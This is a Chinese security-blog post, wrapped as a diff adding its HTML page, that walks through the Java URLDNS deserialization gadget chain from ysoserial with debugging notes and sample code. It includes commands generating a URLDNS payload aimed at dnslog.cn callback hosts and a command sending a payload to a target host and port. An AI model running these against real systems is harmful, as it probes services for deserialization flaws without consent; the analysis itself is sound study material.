@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>URLDNS链 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="URLDNS链">
+  <meta itemprop="datePublished" content="2024-08-15T10:20:01+08:00">
+  <meta itemprop="dateModified" content="2024-08-15T10:20:01+08:00">
+  <meta itemprop="wordCount" content="212">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="URLDNS链">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-08-15T10:20:01+08:00">
+    <meta property="article:modified_time" content="2024-08-15T10:20:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="URLDNS链">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9/" /><link rel="next" href="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/53/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "URLDNS链",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/10\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  212 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/10\/","datePublished": "2024-08-15T10:20:01+08:00","dateModified": "2024-08-15T10:20:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">URLDNS链</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>URLDNS链</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 10:20:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="212 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>One minute</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="原理" class="heading-element"><span>0.0.0.1  原理</span>
+  <a href="#%e5%8e%9f%e7%90%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p><code>java.util.HashMap</code>实现了<code>Serializable</code>接口，重写了<code>readObject</code>, 在反序列化时会调用<code>hash</code>函数计算<code>key</code>的<code>hashCode</code>，而<code>java.net.URL</code>的<code>hashCode</code>在计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求。</p>
+<ul>
+<li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li>
+<li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li>
+<li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li>
+</ul>
+<p>可通过<code># 生成序列化Payload java -jar ysoserial-all.jar URLDNS http://1msjui.dnslog.cn &gt; a.ser</code>生成payload</p>
+<p>测试 : <code>python exploit_deserlab.py [host] [port] payload.bin</code></p>
+<p>然后将序列化payload发给对应的目标结合漏洞让他进行反序列化，这里本地直接写个反序列化过程举例了；</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.FileInputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.IOException</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ObjectInputStream</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">App</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span>, <span style="color:#58a1dd">ClassNotFoundException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectInputStream</span> <span style="color:#58a1dd">objectInputStream</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectInputStream</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">FileInputStream</span>(<span style="color:#a6be9d">&#34;/Users/d4m1ts/d4m1ts/tools/java/ysoserial/target/a.ser&#34;</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">objectInputStream</span>.<span style="color:#58a1dd">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>DNSlog收到了请求</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311051347.webp" alt="image-20240731105150187" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311051347.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311051347.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311051347.webp?size=large 2x" data-title="image-20240731105150187" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<pre tabindex="0"><code>执行反序列化函数readObject()的最后会执行函数hash(key)
+hash()函数调用了key.hashCode()
+所以可以构造反序列化链:
+HashMap.readObject()
+HashMap.hash(key)
+HashMap.key.hashCode()
+将key改为URL对象
+URL.hashCode()
+URL.handler.hashCode()  //向url发出请求</code></pre><h5 id="urldns链分析" class="heading-element"><span>0.0.0.2  URLDNS链分析</span>
+  <a href="#urldns%e9%93%be%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><p>URLDNS是ysoserial里面就简单的一条利用链，但URLDNS的利用效果是只能触发一次dns请求，而不能去执行命令。<strong>比较适用于漏洞验证这一块，尤其是无回显的命令执行</strong>，而且URLDNS这条利用链并不依赖于第三方的类，而是JDK中内置的一些类和方法。</p>
+<p>这里为了方便调试，直接把ysoserial项目导入idea中。</p>
+<p>一开始依赖一直导入不了，右键点击pom.xml然后创建settings.xml，配置镜像以后就可以了</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311540778.webp" alt="image-20240731154046441" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311540778.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311540778.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311540778.webp?size=large 2x" data-title="image-20240731154046441" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>首先生成payload，可以直接利用编译好的jar包：</p>
+<pre tabindex="0"><code>java -jar ysoserial-0.0.5.jar URLDNS http://1msjui.dnslog.cn &gt; urldns.txt</code></pre><p>也可以在IDEA中通过Configurations设置参数之后，再run生成</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311550264.webp" alt="image-20240731155015104" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311550264.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311550264.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311550264.webp?size=large 2x" data-title="image-20240731155015104" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再次运行</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311551529.webp" alt="image-20240731155146286" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311551529.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311551529.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311551529.webp?size=large 2x" data-title="image-20240731155146286" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>打开<code>ysoserial/payloads/URLDNS.java</code>的源码，可以看到它的调用链</p>
+<pre tabindex="0"><code> *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()</code></pre><p>根据上述的<code>Gadget Chain</code>，可见触发点是在<code>HashMap.readObject()</code>，为了节约时间，我们直接在<code>HashMap.readObject()</code>处下断点。</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311555148.webp" alt="image-20240731155518053" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311555148.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311555148.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202407311555148.webp?size=large 2x" data-title="image-20240731155518053" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>中间的调试先省略了，大概跟了一下，说难也不难，去调试ysoserial就是说怎么进行序列化的，后面也会怎么反序列化，感觉跟php的反序列化类似，就是这个类执行另一个类的方法，看能不能找到一条链子，不过java不一样的地方是它是强面向对象的语言，序列化反序列化的过程中会加上很多java语言的特性，所以说还是得学好java的基础</p>
+<p>就像hashmap的put在调用的时候就会请求DNS，但是ysoserial在进行序列化调用的时候却没有请求DNS</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011032509.webp" alt="image-20240801103214398" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011032509.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011032509.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011032509.webp?size=large 2x" data-title="image-20240801103214398" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>再看看Ysoserial里面的URLDNS，多了这些：</p>
+<pre><code>            URLStreamHandler handler = new SilentURLStreamHandler();
+            URL u = new URL(null, url, handler); // URL to use as the Key
+
+    static class SilentURLStreamHandler extends URLStreamHandler {
+
+            protected URLConnection openConnection(URL u) throws IOException {
+                    return null;
+            }
+
+            protected synchronized InetAddress getHostAddress(URL u) {
+                    return null;
+            }
+    }
+</code></pre>
+<p>根据调用链，最后面会调用<code>handler</code>的<code>getHostAddress</code>方法。为了不让在<code>put</code>的时候就触发了<code>URLDNS</code>，<code>Ysoserial</code>自己写了一个类继承<code>URLStreamHandler</code>，然后重写了<code>getHostAddress()</code>方法，防止了<code>put</code>时候的触发。</p>
+<p>我们自己也试一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">URLDNS</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">MalformedURLException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">HashMap</span> <span style="color:#58a1dd">ht</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HashMap</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">url</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;http://amam4v.dnslog.cn/&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">URLStreamHandler</span> <span style="color:#58a1dd">handler</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TestURLStreamHandler</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">u</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">URL</span>(<span style="color:#ff636f">null</span>,<span style="color:#58a1dd">url</span>,<span style="color:#58a1dd">handler</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ht</span>.<span style="color:#58a1dd">put</span>(<span style="color:#58a1dd">u</span>,<span style="color:#58a1dd">url</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">TestURLStreamHandler</span> <span style="color:#ff636f">extends</span> <span style="color:#58a1dd">URLStreamHandler</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#58a1dd">URLConnection</span> <span style="color:#58a1dd">openConnection</span>(<span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">u</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">IOException</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#ff636f">synchronized</span> <span style="color:#58a1dd">InetAddress</span> <span style="color:#58a1dd">getHostAddress</span>(<span style="color:#58a1dd">URL</span> <span style="color:#58a1dd">u</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">null</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>最后就是在这里进行了DNS请求</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011000950.webp" alt="image-20240801100040786" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011000950.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011000950.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011000950.webp?size=large 2x" data-title="image-20240801100040786" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>等到步出这个方法的时候dnslog就多了一条</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011003595.webp" alt="image-20240801100320479" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011003595.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011003595.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011003595.webp?size=large 2x" data-title="image-20240801100320479" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011002119.webp" alt="image-20240801100259001" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011002119.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011002119.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202408011002119.webp?size=large 2x" data-title="image-20240801100259001" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>整个调用链如下：</p>
+<pre tabindex="0"><code>HashMap.readObject() -&gt;  HashMap.putVal() -&gt; HashMap.hash()  -&gt; URL.hashCode() -&gt; URLStreamHandler.hashCode().getHostAddress() -&gt;URLStreamHandler.getHostAddress().InetAddress.getByName()</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 10:20:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
